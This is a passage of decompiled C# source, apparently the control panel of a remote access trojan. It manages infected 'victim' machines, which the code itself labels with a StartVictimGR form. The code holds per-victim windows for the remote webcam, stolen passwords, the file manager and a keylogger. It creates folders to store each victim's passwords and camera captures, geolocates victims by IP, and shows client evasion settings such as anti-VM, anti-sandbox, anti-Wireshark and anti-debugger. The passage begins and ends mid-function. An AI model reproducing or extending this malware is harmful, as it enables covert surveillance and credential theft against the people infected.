			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenScript" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenScript" + sock).Close();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Information" + sock).Close();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OMICForm" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OMICForm" + sock).Close();
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("System Manager" + sock).Close();
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("RD" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("RD" + sock).Close();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + sock).Close();
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenPasswords" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenPasswords" + sock).Close();
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenFileManager" + sock).Close();
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Process Properties" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Process Properties" + sock).Close();
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OPC" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OPC" + sock).Close();
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("CP" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("CP" + sock).Close();
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + sock).Close();
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("WCV" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("WCV" + sock).Close();
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("KE" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("KE" + sock).Close();
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("SPC" + sock) != null)
			{
				((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("SPC" + sock).Close();
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF") == null)
			{
				return;
			}
			TSDGR tSDGR = (TSDGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("TSF");
			try
			{
				IEnumerator enumerator2 = default(IEnumerator);
				try
				{
					enumerator2 = tSDGR.Clients.get_Items().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ListViewItem val3 = (ListViewItem)enumerator2.Current;
						if (Operators.ConditionalCompareObjectEqual(val3.get_Tag(), (object)sock, false))
						{
							val3.Remove();
							ListViewItem val4 = tSDGR.Clogs.get_Items().Add("[" + Conversions.ToString(DateAndTime.get_Now()) + "] - " + text + " : Disconnected");
							val4.set_ForeColor(Color.Red);
							if (tSDGR.Clients.get_Items().get_Count() == 0)
							{
								((Form)tSDGR).Close();
							}
						}
					}
				}
				finally
				{
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
	}

	public void data(int sock, byte[] b)
	{
		//IL_08b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bb: Expected O, but got Unknown
		//IL_098c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0993: Expected O, but got Unknown
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b50: Expected O, but got Unknown
		//IL_0b63: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6d: Expected O, but got Unknown
		//IL_1128: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f46: Unknown result type (might be due to invalid IL or missing references)
		//IL_31c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_31cc: Expected O, but got Unknown
		//IL_3f95: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f9f: Expected O, but got Unknown
		//IL_4074: Unknown result type (might be due to invalid IL or missing references)
		//IL_407e: Expected O, but got Unknown
		//IL_4153: Unknown result type (might be due to invalid IL or missing references)
		//IL_415d: Expected O, but got Unknown
		//IL_4232: Unknown result type (might be due to invalid IL or missing references)
		//IL_423c: Expected O, but got Unknown
		//IL_4311: Unknown result type (might be due to invalid IL or missing references)
		//IL_431b: Expected O, but got Unknown
		//IL_43f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_43fa: Expected O, but got Unknown
		//IL_44e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_44f3: Expected O, but got Unknown
		//IL_45e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_45e9: Expected O, but got Unknown
		//IL_493d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4947: Expected O, but got Unknown
		//IL_4959: Unknown result type (might be due to invalid IL or missing references)
		//IL_4963: Expected O, but got Unknown
		//IL_4975: Unknown result type (might be due to invalid IL or missing references)
		//IL_497f: Expected O, but got Unknown
		//IL_4991: Unknown result type (might be due to invalid IL or missing references)
		//IL_499b: Expected O, but got Unknown
		//IL_49ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_49b7: Expected O, but got Unknown
		//IL_49e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_49f1: Expected O, but got Unknown
		//IL_4a26: Unknown result type (might be due to invalid IL or missing references)
		//IL_4a30: Expected O, but got Unknown
		//IL_4a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_4a7e: Expected O, but got Unknown
		//IL_4ab7: Unknown result type (might be due to invalid IL or missing references)
		//IL_4ac1: Expected O, but got Unknown
		//IL_4af1: Unknown result type (might be due to invalid IL or missing references)
		//IL_4afb: Expected O, but got Unknown
		//IL_4b2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_4b35: Expected O, but got Unknown
		//IL_4b65: Unknown result type (might be due to invalid IL or missing references)
		//IL_4b6f: Expected O, but got Unknown
		//IL_4b9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_4ba9: Expected O, but got Unknown
		//IL_4bd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_4be3: Expected O, but got Unknown
		//IL_4c14: Unknown result type (might be due to invalid IL or missing references)
		//IL_4c1e: Expected O, but got Unknown
		//IL_4d1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_4d28: Expected O, but got Unknown
		//IL_4d59: Unknown result type (might be due to invalid IL or missing references)
		//IL_4d63: Expected O, but got Unknown
		//IL_4d95: Unknown result type (might be due to invalid IL or missing references)
		//IL_4d9f: Expected O, but got Unknown
		//IL_4dd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_4ddb: Expected O, but got Unknown
		//IL_4e0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4e17: Expected O, but got Unknown
		//IL_4e49: Unknown result type (might be due to invalid IL or missing references)
		//IL_4e53: Expected O, but got Unknown
		//IL_4e85: Unknown result type (might be due to invalid IL or missing references)
		//IL_4e8f: Expected O, but got Unknown
		//IL_4ec1: Unknown result type (might be due to invalid IL or missing references)
		//IL_4ecb: Expected O, but got Unknown
		//IL_4efd: Unknown result type (might be due to invalid IL or missing references)
		//IL_4f07: Expected O, but got Unknown
		//IL_4f43: Unknown result type (might be due to invalid IL or missing references)
		//IL_4f4d: Expected O, but got Unknown
		//IL_4f7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_4f89: Expected O, but got Unknown
		//IL_5064: Unknown result type (might be due to invalid IL or missing references)
		//IL_506e: Expected O, but got Unknown
		//IL_50a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_50aa: Expected O, but got Unknown
		//IL_50dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_50e6: Expected O, but got Unknown
		//IL_5118: Unknown result type (might be due to invalid IL or missing references)
		//IL_5122: Expected O, but got Unknown
		//IL_5154: Unknown result type (might be due to invalid IL or missing references)
		//IL_515e: Expected O, but got Unknown
		//IL_5190: Unknown result type (might be due to invalid IL or missing references)
		//IL_519a: Expected O, but got Unknown
		//IL_51cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_51d6: Expected O, but got Unknown
		//IL_520d: Unknown result type (might be due to invalid IL or missing references)
		//IL_5217: Expected O, but got Unknown
		//IL_5249: Unknown result type (might be due to invalid IL or missing references)
		//IL_5253: Expected O, but got Unknown
		//IL_5285: Unknown result type (might be due to invalid IL or missing references)
		//IL_528f: Expected O, but got Unknown
		//IL_52c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_52cb: Expected O, but got Unknown
		//IL_5938: Unknown result type (might be due to invalid IL or missing references)
		//IL_593f: Expected O, but got Unknown
		//IL_5b79: Unknown result type (might be due to invalid IL or missing references)
		//IL_5b80: Expected O, but got Unknown
		//IL_634b: Unknown result type (might be due to invalid IL or missing references)
		//IL_6355: Expected O, but got Unknown
		//IL_63a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_63b3: Expected O, but got Unknown
		//IL_6426: Unknown result type (might be due to invalid IL or missing references)
		//IL_6430: Expected O, but got Unknown
		//IL_656f: Unknown result type (might be due to invalid IL or missing references)
		//IL_6576: Expected O, but got Unknown
		//IL_7029: Unknown result type (might be due to invalid IL or missing references)
		//IL_7030: Expected O, but got Unknown
		//IL_7145: Unknown result type (might be due to invalid IL or missing references)
		//IL_714c: Expected O, but got Unknown
		//IL_72a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_72aa: Expected O, but got Unknown
		//IL_7866: Unknown result type (might be due to invalid IL or missing references)
		//IL_786d: Expected O, but got Unknown
		//IL_78e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_78f0: Expected O, but got Unknown
		//IL_7925: Unknown result type (might be due to invalid IL or missing references)
		//IL_792f: Expected O, but got Unknown
		//IL_8127: Unknown result type (might be due to invalid IL or missing references)
		//IL_8131: Expected O, but got Unknown
		//IL_8245: Unknown result type (might be due to invalid IL or missing references)
		//IL_824f: Expected O, but got Unknown
		//IL_86f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_86fd: Expected O, but got Unknown
		//IL_8792: Unknown result type (might be due to invalid IL or missing references)
		//IL_879c: Expected O, but got Unknown
		//IL_87d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_87df: Expected O, but got Unknown
		//IL_8823: Unknown result type (might be due to invalid IL or missing references)
		//IL_882d: Expected O, but got Unknown
		//IL_8d06: Unknown result type (might be due to invalid IL or missing references)
		//IL_8d10: Expected O, but got Unknown
		//IL_8dd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_8ddc: Expected O, but got Unknown
		//IL_8e6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_8e74: Expected O, but got Unknown
		//IL_90d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_90df: Expected O, but got Unknown
		//IL_9332: Unknown result type (might be due to invalid IL or missing references)
		//IL_94ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_94f3: Expected O, but got Unknown
		//IL_991f: Unknown result type (might be due to invalid IL or missing references)
		//IL_9928: Expected O, but got Unknown
		//IL_99b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_99bf: Expected O, but got Unknown
		//IL_99fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_9a04: Expected O, but got Unknown
		//IL_9a67: Unknown result type (might be due to invalid IL or missing references)
		//IL_9a70: Expected O, but got Unknown
		//IL_9b24: Unknown result type (might be due to invalid IL or missing references)
		//IL_9b2e: Expected O, but got Unknown
		//IL_9bad: Unknown result type (might be due to invalid IL or missing references)
		//IL_9bb7: Expected O, but got Unknown
		//IL_9f3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_9f46: Expected O, but got Unknown
		//IL_9fa0: Unknown result type (might be due to invalid IL or missing references)
		//IL_9fa9: Expected O, but got Unknown
		//IL_a188: Unknown result type (might be due to invalid IL or missing references)
		//IL_a191: Expected O, but got Unknown
		//IL_a21e: Unknown result type (might be due to invalid IL or missing references)
		//IL_a228: Expected O, but got Unknown
		//IL_a263: Unknown result type (might be due to invalid IL or missing references)
		//IL_a26d: Expected O, but got Unknown
		//IL_a2d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_a2d9: Expected O, but got Unknown
		//IL_a38d: Unknown result type (might be due to invalid IL or missing references)
		//IL_a397: Expected O, but got Unknown
		//IL_a3fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_a407: Expected O, but got Unknown
		//IL_a528: Unknown result type (might be due to invalid IL or missing references)
		//IL_a532: Expected O, but got Unknown
		//IL_a59c: Unknown result type (might be due to invalid IL or missing references)
		//IL_a5a5: Expected O, but got Unknown
		//IL_a7bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_a7c8: Expected O, but got Unknown
		//IL_a9f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_b044: Unknown result type (might be due to invalid IL or missing references)
		//IL_b04d: Expected O, but got Unknown
		//IL_b103: Unknown result type (might be due to invalid IL or missing references)
		//IL_b10c: Expected O, but got Unknown
		//IL_b49a: Unknown result type (might be due to invalid IL or missing references)
		//IL_b4a4: Expected O, but got Unknown
		//IL_b5c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_b5d2: Expected O, but got Unknown
		//IL_b723: Unknown result type (might be due to invalid IL or missing references)
		//IL_b72d: Expected O, but got Unknown
		//IL_b840: Unknown result type (might be due to invalid IL or missing references)
		//IL_b849: Expected O, but got Unknown
		//IL_b9e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_b9ee: Expected O, but got Unknown
		//IL_bac2: Unknown result type (might be due to invalid IL or missing references)
		//IL_bacb: Expected O, but got Unknown
		//IL_bbb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_bbc2: Expected O, but got Unknown
		//IL_bcb0: Unknown result type (might be due to invalid IL or missing references)
		//IL_bcb9: Expected O, but got Unknown
		//IL_bda7: Unknown result type (might be due to invalid IL or missing references)
		//IL_bdb0: Expected O, but got Unknown
		//IL_be9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_bea7: Expected O, but got Unknown
		//IL_bfa5: Unknown result type (might be due to invalid IL or missing references)
		//IL_bfae: Expected O, but got Unknown
		//IL_c5dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_c5e7: Expected O, but got Unknown
		//IL_c6cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_c6d6: Expected O, but got Unknown
		//IL_c86d: Unknown result type (might be due to invalid IL or missing references)
		//IL_c877: Expected O, but got Unknown
		//IL_c94a: Unknown result type (might be due to invalid IL or missing references)
		//IL_c953: Expected O, but got Unknown
		//IL_cbc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_cbcf: Expected O, but got Unknown
		//IL_cd66: Unknown result type (might be due to invalid IL or missing references)
		//IL_cd6f: Expected O, but got Unknown
		//IL_d9e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_d9f2: Expected O, but got Unknown
		//IL_dd22: Unknown result type (might be due to invalid IL or missing references)
		//IL_dd2b: Expected O, but got Unknown
		//IL_dea2: Unknown result type (might be due to invalid IL or missing references)
		//IL_deac: Expected O, but got Unknown
		//IL_df98: Unknown result type (might be due to invalid IL or missing references)
		//IL_dfa1: Expected O, but got Unknown
		//IL_e128: Unknown result type (might be due to invalid IL or missing references)
		//IL_e132: Expected O, but got Unknown
		//IL_e21e: Unknown result type (might be due to invalid IL or missing references)
		//IL_e227: Expected O, but got Unknown
		//IL_e3ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_e3b8: Expected O, but got Unknown
		//IL_e4a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_e4ad: Expected O, but got Unknown
		//IL_e662: Unknown result type (might be due to invalid IL or missing references)
		//IL_e66b: Expected O, but got Unknown
		string[] array = Strings.Split(Functions.BS(b), Key, -1, (CompareMethod)0);
		checked
		{
			try
			{
				if (Operators.CompareString(array[0], "Inf", false) == 0)
				{
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[1]) + "\\Downloads\\"))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Downloads\\");
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Desktop\\"))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Desktop\\");
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Logs\\"))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Logs\\");
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Camera\\"))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Camera\\");
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					try
					{
						if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Passwords\\"))
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + SocketServer.Decode(array[2]) + "\\Passwords\\");
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					StartVictimGR startVictimGR = (StartVictimGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("new" + Conversions.ToString(sock));
					if (startVictimGR == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							((Control)this).Invoke((Delegate)new _data(this.data), new object[2] { sock, b });
							return;
						}
						startVictimGR = new StartVictimGR();
						((Control)startVictimGR).set_Name("new" + Conversions.ToString(sock));
						((Form)startVictimGR).set_TopMost(false);
						((Form)startVictimGR).set_TopLevel(true);
						startVictimGR.Label4.set_Text(Functions.DEB(array[1]) + Functions.DEB(array[2]));
						startVictimGR.Label5.set_Text(GeoIP.LookupCountryName(s.IP(ref sock)) + " [" + GeoIP.LookupCountryCode(s.IP(ref sock)) + "]");
						startVictimGR.PictureBox1.set_Image(ImageList1.get_Images().get_Item(GeoIP.LookupCountryCode(s.IP(ref sock)) + ".png"));
						((Control)startVictimGR).Show();
					}
					ListViewItem val = listV1.get_Items().Add(sock.ToString(), GeoIP.LookupCountryName(s.IP(ref sock)) + " [" + GeoIP.LookupCountryCode(s.IP(ref sock)) + "]", GeoIP.LookupCountryCode(s.IP(ref sock)) + ".png");
					val.get_SubItems().Add(Functions.DEB(array[1]) + Functions.DEB(array[2]));
					val.get_SubItems().Add(s.IP(ref sock) + " / " + array[3]);
					val.get_SubItems().Add(Functions.DEB(array[4]));
					val.get_SubItems().Add(array[5]);
					val.get_SubItems().Add(Functions.DEB(array[6]) + " Bits");
					val.get_SubItems().Add(Functions.DEB(array[7]));
					val.get_SubItems().Add(Functions.siz(array[8]));
					val.get_SubItems().Add(Functions.DEB(array[9]));
					val.get_SubItems().Add(Functions.DEB(array[10]));
					val.get_SubItems().Add(array[12]);
					val.get_SubItems().Add("....");
					val.get_SubItems().Add(Functions.DEB(array[11]));
					val.set_ToolTipText(sock.ToString());
					val.set_Tag((object)"0");
					try
					{
						ListViewItem val2 = Logs.get_Items().Add(sock.ToString(), "[ " + Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.get_Now()))) + " ] IP : " + s.IP(ref sock) + " - Server ID : " + Functions.DEB(array[1]) + Functions.DEB(array[2]), GeoIP.LookupCountryCode(s.IP(ref sock)) + ".png");
						val2.get_SubItems().Add("Online").set_ForeColor(Color.Green);
						val2.set_ForeColor(Color.Green);
						val2.set_ToolTipText(GeoIP.LookupCountryName(s.IP(ref sock)) + ".png");
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "PVC", false) == 0)
				{
					s.Send(sock, "PWC");
				}
				else if (Operators.CompareString(array[0], "PWC", false) == 0)
				{
					try
					{
						IEnumerator enumerator = default(IEnumerator);
						try
						{
							enumerator = listV1.get_Items().GetEnumerator();
							while (enumerator.MoveNext())
							{
								ListViewItem val3 = (ListViewItem)enumerator.Current;
								if ((listV1.get_Items().get_Count() > 0 && Conversions.ToDouble(val3.get_ToolTipText()) == (double)sock) ? true : false)
								{
									val3.get_SubItems().get_Item(11).set_Text(array[1] + " ms");
									val3.set_Tag((object)"0");
								}
							}
						}
						finally
						{
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "GAW", false) == 0)
				{
					try
					{
						IEnumerator enumerator2 = default(IEnumerator);
						try
						{
							enumerator2 = listV1.get_Items().GetEnumerator();
							while (enumerator2.MoveNext())
							{
								ListViewItem val4 = (ListViewItem)enumerator2.Current;
								if ((listV1.get_Items().get_Count() > 0 && Conversions.ToDouble(val4.get_ToolTipText()) == (double)sock) ? true : false)
								{
									val4.get_SubItems().get_Item(12).set_Text(Convert.ToString(SocketServer.Decode(array[1])));
								}
							}
						}
						finally
						{
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "CIN", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Infclient" + array[1]) == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data = this.data;
							((Control)this).Invoke((Delegate)data, new object[2] { sock, b });
						}
						else
						{
							CINGR cINGR = new CINGR();
							((Control)cINGR).set_Name("Infclient" + array[1]);
							((Form)cINGR).set_Text("[ Client Information ][ " + listV1.get_SelectedItems().get_Item(0).get_SubItems()
								.get_Item(1)
								.get_Text() + " | " + s.IP(ref sock) + " ]");
							cINGR.ListView1.get_Groups().Add(new ListViewGroup("Client Connection ", (HorizontalAlignment)0));
							cINGR.ListView1.get_Groups().Add(new ListViewGroup("Client Settings ", (HorizontalAlignment)0));
							ListViewItem val5 = cINGR.ListView1.get_Items().Add("Host : ", "0.png");
							val5.get_SubItems().Add(array[1]);
							ListViewItem val6 = cINGR.ListView1.get_Items().Add("Port : ", "1.png");
							val6.get_SubItems().Add(array[2]);
							ListViewItem val7 = cINGR.ListView1.get_Items().Add("Reconnect Delay : ", "2.png");
							val7.get_SubItems().Add(array[3]);
							ListViewItem val8 = cINGR.ListView1.get_Items().Add("Install Date : ", "3.png");
							val8.get_SubItems().Add(array[4]);
							ListViewItem val9 = cINGR.ListView1.get_Items().Add("Client Path : ", "4.png");
							val9.get_SubItems().Add(array[5]);
							ListViewItem val10 = cINGR.ListView1.get_Items().Add("Mutex : ", "5.png");
							val10.get_SubItems().Add(array[6]);
							ListViewItem val11 = cINGR.ListView1.get_Items().Add("Hide After Run : ", "6.png");
							val11.get_SubItems().Add(array[7]);
							ListViewItem val12 = cINGR.ListView1.get_Items().Add("Protect Process : ", "7.png");
							val12.get_SubItems().Add(array[8]);
							ListViewItem val13 = cINGR.ListView1.get_Items().Add("Anti VM : ", "8.png");
							val13.get_SubItems().Add(array[9]);
							ListViewItem val14 = cINGR.ListView1.get_Items().Add("Anti SB : ", "9.png");
							val14.get_SubItems().Add(array[10]);
							ListViewItem val15 = cINGR.ListView1.get_Items().Add("Anti Emulation : ", "10.png");
							val15.get_SubItems().Add(array[11]);
							ListViewItem val16 = cINGR.ListView1.get_Items().Add("Anti Wireshark : ", "11.png");
							val16.get_SubItems().Add(array[12]);
							ListViewItem val17 = cINGR.ListView1.get_Items().Add("Anti Debugger : ", "12.png");
							val17.get_SubItems().Add(array[13]);
							cINGR.ListView1.get_Items().get_Item(0).set_Group(cINGR.ListView1.get_Groups().get_Item(0));
							cINGR.ListView1.get_Items().get_Item(1).set_Group(cINGR.ListView1.get_Groups().get_Item(0));
							cINGR.ListView1.get_Items().get_Item(2).set_Group(cINGR.ListView1.get_Groups().get_Item(0));
							cINGR.ListView1.get_Items().get_Item(3).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(4).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(5).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(6).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(7).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(8).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(9).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(10).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(11).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							cINGR.ListView1.get_Items().get_Item(12).set_Group(cINGR.ListView1.get_Groups().get_Item(1));
							((Control)cINGR).Show();
						}
					}
				}
				else if (Operators.CompareString(array[0], "FPRO", false) == 0)
				{
					if (((Control)this).get_InvokeRequired())
					{
						_data data2 = this.data;
						((Control)this).Invoke((Delegate)data2, new object[2] { sock, b });
					}
					else
					{
